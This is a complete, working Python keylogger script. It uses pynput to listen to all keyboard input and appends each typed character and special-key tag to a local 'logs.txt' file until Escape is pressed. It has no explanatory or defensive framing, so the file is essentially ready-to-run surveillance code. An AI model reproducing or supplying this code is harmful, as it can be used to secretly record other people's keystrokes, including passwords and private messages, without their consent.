import pynput
from pynput.keyboard import Key, Listener
# Define the path to the log file where keystrokes will be saved
logs = 'logs.txt'
# Define key mappings
enter = '<enter>'
backspace = '<backspace>'
caps_lock = '<caps_lock>'
tab = '<tab>'
# Function to handle key presses
def on_press(key):
    try:
        with open(logs, 'a') as f_in:
            # Log the alphanumeric keys or special characters
            if hasattr(key, 'char') and key.char is not None:
                f_in.write(key.char)
            # Handle special keys
            else:
                if key == Key.space:
                    f_in.write(' ')
                elif key == Key.enter:
                    f_in.write(enter)
                elif key == Key.backspace:
                    f_in.write(backspace)
                elif key == Key.caps_lock:
                    f_in.write(caps_lock)
                elif key == Key.tab:
                    f_in.write(tab)
                elif key == Key.esc:
                    # Exit the listener if Escape key is pressed
                    return False
    except Exception as e:
        print(f"Error while writing to file: {e}")
with Listener(on_press=on_press) as listener:
    listener.join()
